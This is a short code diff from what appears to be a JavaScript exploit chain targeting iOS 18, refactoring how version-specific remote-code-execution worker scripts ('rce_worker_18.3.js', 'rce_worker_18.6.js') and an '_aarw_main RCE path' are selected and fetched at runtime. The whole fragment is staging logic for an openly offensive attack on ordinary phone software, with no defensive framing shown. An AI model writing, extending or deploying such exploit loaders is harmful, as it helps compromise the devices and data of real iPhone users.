@@ -259,18 +259,20 @@ function isLateIos18WorkerPath(version) {
 function isEarlyIos18Path(version) {
     return Array.isArray(version) && version[0] === 18 && version[1] >= 0 && version[1] <= 3;
 }
-function isIos183Path(version) {
-    return Array.isArray(version) && version[0] === 18 && version[1] === 3;
-}
 function isSupportedWorkerIos(version) {
     return Array.isArray(version) && version[0] === 18 && version[1] >= 0 && version[1] <= 7;
 }
 function isWorkerRcePath(version) {
     return true;
 }
+function workerRceScriptName(version) {
+    return isEarlyIos18Path(version) ? 'rce_worker_18.3.js' : 'rce_worker_18.6.js';
+}
 function rcePathName(version) {
     if (isWorkerRcePath(version)) {
-        return "forced iOS 18.3/18.6 worker _aarw_main RCE path";
+        if (isEarlyIos18Path(version)) return "early iOS 18.0-18.3 worker _aarw_main RCE path";
+        if (isLateIos18WorkerPath(version)) return "late iOS 18.6/18.7 worker _aarw_main RCE path";
+        return "iOS 18.x worker _aarw_main RCE path";
     }
     return "iOS 18.x check_attempt RCE path";
 }
@@ -286,7 +288,7 @@ print("Cache token: " + (globalThis.__ls_cache_bust || '(none)'));
 print("Loading worker code...");
 let workerCode = "";
 if(isWorkerRcePath(ios_version)) {
-    let workerName = isIos183Path(ios_version) ? 'rce_worker_18.3.js' : 'rce_worker_18.6.js';
+    let workerName = workerRceScriptName(ios_version);
     print("Using " + workerName + " for " + rcePathName(ios_version));
     workerCode = getJS(cacheBustURL(workerName)); // local version
     if (!workerCode || !workerCode.trim()) {
